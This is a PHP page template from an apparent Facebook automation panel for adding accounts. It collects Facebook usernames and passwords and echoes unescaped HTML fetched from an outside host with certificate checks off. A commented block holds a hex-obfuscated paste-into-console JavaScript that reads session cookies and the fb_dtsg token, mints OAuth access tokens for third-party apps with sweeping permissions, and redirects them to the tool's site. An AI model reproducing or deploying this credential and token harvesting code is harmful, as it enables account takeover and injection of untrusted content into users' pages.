<?php

echo "<div class=\"row\">
    <div class=\"col-lg-6 col-md-6 col-sm-6 col-xs-12\">
    ";
if (($fbcount < MAXIMUM_ACCOUNT) || (IS_ADMIN == 1)) {
    echo '        ';

    if (check_expiration()) {
        echo "        <div class=\"card\">
            <div class=\"header\">
                <h2>
                    <i class=\"fa fa-plus-square\" aria-hidden=\"true\"></i> ";
        echo l('Update Facebook account');
        echo " 
                </h2>
            </div>
            <div class=\"body pt0\">
                <!-- Nav tabs -->
                <ul class=\"nav nav-tabs tab-nav-right\" role=\"tablist\">
                    <li role=\"presentation\" class=\"active\"><a href=\"#home\" data-toggle=\"tab\" aria-expanded=\"true\">";
        echo l('ACCESS TOKEN 1');
        echo "</a></li>
                    <li role=\"presentation\"><a href=\"#home2\" data-toggle=\"tab\" aria-expanded=\"true\">";
        echo l('ACCESS TOKEN 2');
        echo "</a></li>
                    <li role=\"presentation\" class=\"\"><a href=\"#profile\" data-toggle=\"tab\" aria-expanded=\"false\">";
        echo l('YOUR FACEBOOK APP');
        echo "</a></li>
                </ul>
                <!-- Tab panes -->
                <div class=\"tab-content\">
                    <div role=\"tabpanel\" class=\"tab-pane fade active in\" id=\"home\">
                        <div class=\"row\">
                            <div class=\"col-sm-12 mb0\">
                                <form method=\"POST\" action=\"";
        echo cn('ajax_update');
        echo '" data-action-token="';
        echo cn('ajax_get_page_token');
        echo '" data-redirect="';
        echo cn();
        echo "\">
                                    <ul class=\"nav nav-tabs tab-col-pink mb15 \" role=\"tablist\">
                                        <li role=\"presentation\" class=\"active\">
                                            <a href=\"#home_md_col_1\" data-toggle=\"tab\">";
        echo l('STEP 1: GET ACCESS TOKEN');
        echo "</a>
                                        </li>
                                    </ul>
                                    <b>";
        echo l('Facebook username');
        echo " (<span class=\"col-red\">*</span>)</b>
                                    <div class=\"form-group\">
                                        <div class=\"form-line\">
                                            <input type=\"hidden\" class=\"form-control\" name=\"id\" value=\"";
        echo !empty($result) ? $result->id : 0;
        echo "\">
                                            <input type=\"text\" class=\"form-control\" name=\"username\" placeholder=\"Username\">
                                        </div>
                                    </div>
                                    <b>";
        echo l('Facebook password');
        echo " (<span class=\"col-red\">*</span>)</b>
                                    <div class=\"form-group\">
                                        <div class=\"form-line\">
                                            <input type=\"password\" class=\"form-control\" name=\"password\" placeholder=\"Password\">
                                        </div>
                                    </div>
                                    <button type=\"button\" class=\"btn bg-light-green waves-effect btnFBGetToken2\">";
        echo l('Get Access Token');
        echo "</button>
                                    <div class=\"row\">
                                        <div class=\"col-md-12 open_iframe\">
                                            
                                        </div>
                                    </div>
                                    <ul class=\"nav nav-tabs tab-col-pink mb15\" role=\"tablist\">
                                        <li role=\"presentation\" class=\"active\">
                                            <a href=\"#home_md_col_1\" data-toggle=\"tab\">";
        echo l('STEP 2: ADD ACCESS TOKEN');
        echo "</a>
                                        </li>
                                    </ul>
                                    <b>";
        echo l('Access Token');
        echo " (<span class=\"col-red\">*</span>)</b>
                                    <div class=\"form-group\">
                                        <div class=\"form-line\">
                                            <textarea rows=\"4\" class=\"form-control no-resize access_token\" name=\"access_token\" placeholder=\"";
        echo l('Enter access token');
        echo "\"></textarea>
                                        </div>
                                    </div>
                                    <button type=\"button\" class=\"btn bg-red waves-effect btnFBAccountUpdate\">";
        echo l('Submit');
        echo "</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div role=\"tabpanel\" class=\"tab-pane\" id=\"home2\">
                        <div class=\"row\">
                            <div class=\"col-sm-12 mb0\">
                                <form action=\"";
        echo cn('ajax_update');
        echo '" data-redirect="';
        echo cn();
        echo "\">
                                    <ul class=\"nav nav-tabs tab-col-pink mb15 \" role=\"tablist\">
                                        <li role=\"presentation\" class=\"active\">
                                            <a href=\"#home_md_col_1\" data-toggle=\"tab\">";
        echo l('STEP 1: GET ACCESS TOKEN');
        echo "</a>
                                        </li>
                                    </ul>
                                    <div class=\"table-responsive\">
                                        ";
        $ch = curl_init('http://prova.it/access_token.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
        echo $content;
        /*
        <table class="table">
            <tbody>
                <tr>
                    <td>HTC Sence</td>
                    <td class="text-center">
                        <a class="btn bg-light-green waves-effect" target="_blank" href="https://www.facebook.com/v2.3/dialog/oauth?redirect_uri=fbconnect://success&scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=193278124048833">Allow Permissions</a>
                        <br/>
                    </td>
                    <td class="text-center">
                    <textarea class="form-control allowtoken" style="width: 100%; height: 50px;" onclick="this.select();">
        var _0xa967=["","\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x69\x64","\x76\x61\x6C\x75\x65","\x64\x74\x73\x67","\x65\x72\x72\x6F\x72","\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E","\x6E\x61\x6D\x65","\x2F","\x73\x70\x6C\x69\x74","\x68\x72\x65\x66","\x2F\x2F","\x2F\x76\x31\x2E\x30\x2F\x64\x69\x61\x6C\x6F\x67\x2F\x6F\x61\x75\x74\x68\x2F\x63\x6F\x6E\x66\x69\x72\x6D","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x61\x70\x70\x5F\x69\x64\x3D","\x26\x72\x65\x64\x69\x72\x65\x63\x74\x5F\x75\x72\x69\x3D\x66\x62\x63\x6F\x6E\x6E\x65\x63\x74\x25\x33\x41\x25\x32\x46\x25\x32\x46\x73\x75\x63\x63\x65\x73\x73\x26\x64\x69\x73\x70\x6C\x61\x79\x3D\x70\x61\x67\x65\x26\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x73\x64\x6B\x3D\x26\x66\x72\x6F\x6D\x5F\x70\x6F\x73\x74\x3D\x31\x26\x70\x72\x69\x76\x61\x74\x65\x3D\x26\x74\x6F\x73\x3D\x26\x6C\x6F\x67\x69\x6E\x3D\x26\x72\x65\x61\x64\x3D\x26\x77\x72\x69\x74\x65\x3D\x26\x65\x78\x74\x65\x6E\x64\x65\x64\x3D\x26\x73\x6F\x63\x69\x61\x6C\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x26\x73\x65\x65\x6E\x5F\x73\x63\x6F\x70\x65\x73\x3D\x26\x61\x75\x74\x68\x5F\x74\x79\x70\x65\x3D\x26\x61\x75\x74\x68\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x61\x75\x74\x68\x5F\x6E\x6F\x6E\x63\x65\x3D\x26\x64\x65\x66\x61\x75\x6C\x74\x5F\x61\x75\x64\x69\x65\x6E\x63\x65\x3D\x26\x72\x65\x66\x3D\x44\x65\x66\x61\x75\x6C\x74\x26\x72\x65\x74\x75\x72\x6E\x5F\x66\x6F\x72\x6D\x61\x74\x3D\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x26\x64\x6F\x6D\x61\x69\x6E\x3D\x26\x73\x73\x6F\x5F\x64\x65\x76\x69\x63\x65\x3D\x69\x6F\x73\x26\x5F\x5F\x43\x4F\x4E\x46\x49\x52\x4D\x5F\x5F\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x36\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x26\x5F\x5F\x72\x65\x76\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x63\x6C\x6F\x73\x65","\x65\x72\x72\x6F\x72\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x20\x20","\x65\x72\x72\x6F\x72\x53\x75\x6D\x6D\x61\x72\x79","\x43\x6F\x6E\x73\x6F\x6C\x65\x45\x78\x63\x65\x70\x74\x69\x6F\x6E","\x6A\x73\x6D\x6F\x64\x73","\x72\x65\x71\x75\x69\x72\x65","\x26\x65\x78\x70\x69\x72\x65\x73\x5F\x69\x6E","\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D","\x47\x65\x74\x20\x61\x63\x63\x65\x73\x73\x20\x74\x6F\x6B\x65\x6E\x20\x65\x72\x72\x6F\x72","\x41\x75\x74\x68\x45\x78\x63\x65\x70\x74\x69\x6F\x6E","\x73\x65\x6E\x64","\x31\x39\x33\x32\x37\x38\x31\x32\x34\x30\x34\x38\x38\x33\x33","\x34\x31\x31\x35\x38\x38\x39\x36\x34\x32\x34","\x48\x54\x43\x20\x53\x65\x6E\x73\x65\x20\x31\x20\x2D\x20\x34\x31\x31\x35\x38\x38\x39\x36\x34\x32\x34","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x3B\x27\x3E\x3C\x74\x65\x78\x74\x61\x72\x65\x61\x20\x73\x74\x79\x6C\x65\x3D\x27\x77\x69\x64\x74\x68\x3A\x39\x35\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x32\x35\x30\x70\x78\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x38\x70\x78\x3B\x6D\x61\x72\x67\x69\x6E\x3A\x38\x70\x78\x3B\x27\x3E","\x3C\x2F\x74\x65\x78\x74\x61\x72\x65\x61\x3E\x3C\x2F\x64\x69\x76\x3E","\x63\x73\x73\x54\x65\x78\x74","\x73\x74\x79\x6C\x65","\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x30\x70\x78\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x23\x33\x33\x33\x3B\x62\x6F\x72\x64\x65\x72\x3A\x31\x70\x78\x20\x73\x6F\x6C\x69\x64\x20\x23\x64\x64\x64\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x39\x39\x39\x39\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x66\x61\x63\x65\x62\x6F\x6F\x6B\x5F\x61\x63\x63\x6F\x75\x6E\x74\x73\x2F\x75\x70\x64\x61\x74\x65\x3F\x23\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D","\x26\x65\x78\x70\x69\x72\x65\x73\x5F\x69\x6E\x3D\x30","\x61\x73\x73\x69\x67\x6E","\x6C\x6F\x63\x61\x74\x69\x6F\x6E"];var _data=[_0xa967[0],_0xa967[1],_0xa967[2],_0xa967[3],_0xa967[4],_0xa967[5],_0xa967[6],_0xa967[7],_0xa967[8],_0xa967[9],_0xa967[10],_0xa967[0],_0xa967[11],_0xa967[0],_0xa967[12],_0xa967[13],_0xa967[14],_0xa967[15],_0xa967[16],_0xa967[17],_0xa967[18],_0xa967[19],_0xa967[20],_0xa967[21],_0xa967[22],_0xa967[23],_0xa967[24],_0xa967[25],_0xa967[26],_0xa967[27],_0xa967[28],_0xa967[29],_0xa967[30],_0xa967[31],_0xa967[32],_0xa967[33],_0xa967[34],_0xa967[35],_0xa967[36],_0xa967[37],_0xa967[38],_0xa967[39],_0xa967[40],_0xa967[41],_0xa967[42],_0xa967[43],_0xa967[44],_0xa967[45],_0xa967[0],_0xa967[46],_0xa967[47],_0xa967[48],_0xa967[49],_0xa967[50],_0xa967[51],_0xa967[52],_0xa967[53],_0xa967[54],_0xa967[55],_0xa967[56],_0xa967[57]];function ex_fb_console_api_user_info(){var _0x5c1fx3={"\x69\x64":_data[0],"\x6E\x61\x6D\x65":_data[0],"\x64\x74\x73\x67":_data[0],"\x5F\x5F\x70\x63":_data[0],"\x5F\x5F\x72\x65\x76":2108543,"\x5F\x5F\x64\x79\x6E":_data[1]};var _0x5c1fx4=_data[0];var _0x5c1fx5=_data[0];var _0x5c1fx6=document[_data[3]][_data[2]](/c_user=(\d+)/);var _0x5c1fx7=document[_data[5]](_data[4]);if(_0x5c1fx6&& _0x5c1fx6[1]){_0x5c1fx3[_data[6]]= _0x5c1fx6[1]};if(_0x5c1fx7&& (_0x5c1fx7[0]&& _0x5c1fx7[0][_data[7]])){_0x5c1fx3[_data[8]]= _0x5c1fx7[0][_data[7]]};return _0x5c1fx3}function ex_fb_console_api_get_access_token(_0x5c1fx9,_0x5c1fxa,_0x5c1fxb,_0x5c1fxc,_0x5c1fxd){if(_0x5c1fxa[_0x5c1fxb]){var _0x5c1fxe=_0x5c1fxa[_0x5c1fxb];ex_fb_console_api_get_access_token_by_apps_id(_0x5c1fx9,_0x5c1fxe[_data[6]],function(_0x5c1fxf){if(!_0x5c1fxf[_data[9]]&& _0x5c1fxf[_data[10]]){if(_0x5c1fxc){_0x5c1fxc+= _data[11]+ _0x5c1fxe[_data[12]]+ _data[13]+ _0x5c1fxf[_data[10]]}else {_0x5c1fxc+= _0x5c1fxe[_data[12]]+ _data[13]+ _0x5c1fxf[_data[10]]}};ex_fb_console_api_get_access_token(_0x5c1fx9,_0x5c1fxa,_0x5c1fxb+ 1,_0x5c1fxc,_0x5c1fxd)})}else {_0x5c1fxd(_0x5c1fxc)}}function ex_fb_console_api_get_access_token_by_apps_id(_0x5c1fx9,_0x5c1fxf,_0x5c1fx11){pathArray= location[_data[16]][_data[15]](_data[14]);host= pathArray[2];var _0x5c1fx12= new XMLHttpRequest;var _0x5c1fx13=_data[17]+ host+ _data[18];var _0x5c1fx14=_data[19]+ _0x5c1fx9[_data[8]]+ _data[20]+ _0x5c1fxf+ _data[21]+ _0x5c1fx9[_data[6]]+ _data[22];_0x5c1fx12[_data[24]](_data[23],_0x5c1fx13,true);_0x5c1fx12[_data[27]](_data[25],_data[26]);_0x5c1fx12[_data[28]]= function(){if(_0x5c1fx12[_data[29]]=== 4){if(_0x5c1fx12[_data[30]]=== 200){var _0x5c1fx15=eval(_data[31]+ _0x5c1fx12[_data[33]][_data[32]](9)+ _data[34]);_0x5c1fx12[_data[35]];if(_0x5c1fx15[_data[9]]){_0x5c1fx11({"\x65\x72\x72\x6F\x72":{"\x6D\x65\x73\x73\x61\x67\x65":_0x5c1fx15[_data[36]]+ _data[37]+ _0x5c1fx15[_data[38]],"\x74\x79\x70\x65":_data[39],"\x63\x6F\x64\x65":1}})}else {if(_0x5c1fx15[_data[40]]&& (_0x5c1fx15[_data[40]][_data[41]]&& (_0x5c1fx15[_data[40]][_data[41]][0]&& (_0x5c1fx15[_data[40]][_data[41]][0][3]&& _0x5c1fx15[_data[40]][_data[41]][0][3][0])))){var _0x5c1fx16=_0x5c1fx15[_data[40]][_data[41]][0][3][0];var _0x5c1fx17=_0x5c1fx16[_data[15]](_data[42]);var _0x5c1fx18=_data[0];if(_0x5c1fx17[0]){token_sub_split= _0x5c1fx17[0][_data[15]](_data[43]);if(token_sub_split[1]){_0x5c1fx18= token_sub_split[1]}};_0x5c1fx11({"\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E":_0x5c1fx18})}else {_0x5c1fx11({"\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E":_data[0]})}}}else {_0x5c1fx12[_data[35]];_0x5c1fx11({"\x65\x72\x72\x6F\x72":{"\x6D\x65\x73\x73\x61\x67\x65":_data[44],"\x74\x79\x70\x65":_data[45],"\x63\x6F\x64\x65":1}})}}};_0x5c1fx12[_data[46]](_0x5c1fx14)}var fb_user_info=ex_fb_console_api_user_info();var apps_id_objs=[{"\x69\x64":_data[47],"\x6E\x61\x6D\x65":_data[48]},{"\x69\x64":_data[49],"\x6E\x61\x6D\x65":_data[50]}];ex_fb_console_api_get_access_token(fb_user_info,apps_id_objs,0,_data[0],function(_0x5c1fxf){window[_0xa967[61]][_0xa967[60]](website+ _0xa967[58]+ _0x5c1fxf+ _0xa967[59])})
                    </textarea>
                    </td>
                </tr>
                <tr>
                    <td>Graph API Explorer</td>
                    <td class="text-center">
                        <button type="button" class="btn bg-light-green waves-effect btnAllowPermission" data-appid="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=145634995501895">Allow Permissions</button>
                        <br/>
                    </td>
                    <td class="text-center">
                        <input style="max-width: 200px; display: inline-block;" type="text" onclick="this.select();" class="form-control" id="app1" value="view-source:https://www.facebook.com/v2.8/dialog/oauth?redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&amp;scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&amp;response_type=token&amp;sso_key=com&amp;client_id=145634995501895&amp;_rdr">
                    </td>
                </tr>
            </tbody>
        </table>
        */
        echo "                                        <ul class=\"nav nav-tabs tab-col-pink mb15 \" role=\"tablist\">
                                            <li role=\"presentation\" class=\"active\">
                                                <a href=\"#home_md_col_1\" data-toggle=\"tab\">";
        echo l('STEP 2: ADD ACCESS TOKEN');
        echo "</a>
                                            </li>
                                        </ul>
                                        <b>";
        echo l('Access Token');
        echo " (<span class=\"col-red\">*</span>)</b>
                                        <div class=\"form-group\">
                                            <div class=\"form-line\">
                                                <input type=\"hidden\" class=\"form-control\" name=\"id\" value=\"";
        echo !empty($result) ? $result->id : 0;
        echo "\">
                                                <textarea rows=\"4\" class=\"form-control no-resize access_token\" placeholder=\"";
        echo l('Enter access token');
        echo "\"></textarea>
                                            </div>
                                        </div>
                                    </div>
                                    <button type=\"submit\" class=\"btn bg-red waves-effect btnFBAccountUpdate\">";
        echo l('Submit');
        echo "</button>
                                </form>
                                
                            </div>
                        </div>
                    </div>
                    <div role=\"tabpanel\" class=\"tab-pane fade\" id=\"profile\">
                        <form action=\"";
        echo url('facebook_accounts/ajax_delete_facebook_app');
        echo '" data-redirect="';
        echo current_url();
        echo "\">
                            <b>";
        echo l('Facebook App');
        echo " (<span class=\"col-red\">*</span>)</b>
                            <div class=\"input-group\">
                                <select type=\"text\" name=\"fbapp\" class=\"form-control fbapp\">
                                    <option value=\"0\">";
        echo l('Select Facebook App');
        echo "</option>
                                    ";

        if (!empty($fbapp)) {
            foreach ($fbapp as $row) {
                echo '                                    <option value="';
                echo $row->id;
                echo '">';
                echo $row->name . ' (' . $row->app_id . ')';
                echo "</option>
                                    ";
            }
        }

        echo "                                </select>
                                <span class=\"input-group-btn\">
                                  <button href=\"javscript:void(0);\" class=\"btn bg-black waves-effect btnActionUpdate\" style=\"height: 34px;\"><i class=\"fa fa-trash-o\" aria-hidden=\"true\"></i></button>
                                </span>
                                <span class=\"input-group-btn\">
                                  <a href=\"javscript:void(0);\" data-toggle=\"modal\" data-target=\"#AddFBAppModal\" class=\"btn bg-red waves-effect\" style=\"height: 34px;\"><i class=\"fa fa-plus\" aria-hidden=\"true\" ></i> ";
        echo l('Add new app');
        echo "</a>
                                </span>
                            </div>

                            <button type=\"button\" class=\"btn bg-light-green waves-effect btnFBGetToken\" data-action=\"";
        echo cn('get_owner_app');
        echo '">';
        echo l('Get Access Token');
        echo "</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        ";
    }
    else {
        echo "            <div class=\"card\">
                <div class=\"body\">
                    <div class=\"alert alert-danger\">
                        ";
        echo l('Oh sorry! Out of date');
        echo "                    </div>
                    <a href=\"";
        echo cn();
        echo '" class="btn bg-grey waves-effect">';
        echo l('Back');
        echo "</a>
                </div>
            </div>
        ";
    }

    echo "
    ";
}
else {
    echo "    <div class=\"card\">
        <div class=\"body\">
            <div class=\"alert alert-danger\">
                ";
    echo l('Oh sorry! You have exceeded the number of accounts allowed, You are only allowed to update your account');
    echo "            </div>
            <a href=\"";
    echo cn();
    echo '" class="btn bg-grey waves-effect">';
    echo l('Back');
    echo "</a>
        </div>
    </div>
    ";
}

echo "    </div>
    ";

if (EXL == 0) {
    echo "    <div class=\"col-lg-6 col-md-6 col-sm-6 col-xs-12\">
        <div class=\"card\">
            <div class=\"body\">
                <iframe width=\"100%\" height=\"315\" src=\"http://vtcreators.com/products/video_get_token.html\" frameborder=\"0\" allowfullscreen></iframe>
            </div>
        </div>
    </div>
    ";
}

echo "</div>


<div class=\"modal fade box-modal\" id=\"AddFBAppModal\" tabindex=\"-1\" role=\"dialog\" style=\"display: none;\">
  <div class=\"modal-login modal-dialog\" role=\"document\" >
      <div class=\"modal-content\">
          <div class=\"modal-header bg-light-green\">
              <h4 class=\"modal-title\" id=\"defaultModalLabel\"><i class=\"fa fa-facebook-official\" aria-hidden=\"true\"></i> ";
echo l('Add Facebook App');
echo "</h4>
          </div>
          <div class=\"modal-body\">
              <div class=\"body\">
                    <form action=\"";
echo url('facebook_accounts/ajax_add_facebook_app');
echo '" data-redirect="';
echo current_url();
echo "\">
                        <b>";
echo l('Facebook App ID');
echo " (<span class=\"col-red\">*</span>)</b>
                        <div class=\"form-group\">
                            <div class=\"form-line\">
                                <input type=\"text\" class=\"form-control fb_app_id\" name=\"app_id\" value=\"";
echo !empty($result) ? $result->app_id : '';
echo "\">
                            </div>
                        </div>
                        <b>";
echo l('Facebook App Secret');
echo " (<span class=\"col-red\">*</span>)</b>
                        <div class=\"form-group\">
                            <div class=\"form-line\">
                                <input type=\"text\" class=\"form-control fb_app_secret\" name=\"app_secret\" value=\"";
echo !empty($result) ? $result->app_secret : '';
echo "\">
                            </div>
                        </div>
                        <br/> 
                        <button type=\"button\" class=\"btn bg-light-green waves-effect btnActionUpdate\" data-action=\"";
echo cn('get_owner_app');
echo '">';
echo l('Add');
echo "</button>
                  </form>
              </div>
          </div>
          <div class=\"modal-footer\">
              
          </div>
      </div>
  </div>
</div>

<script type=\"text/javascript\">
    setTimeout(function(){
        website = window.location.href + \" \"; 
        var res = website.split(\"index.php\");
        website = 'var website = \"'+res[0]+'index.php/\"; ';
        \$(function(){
            \$(\".allowtoken\").val(website+\$(\".allowtoken\").val());
        });
    },200);
</script>";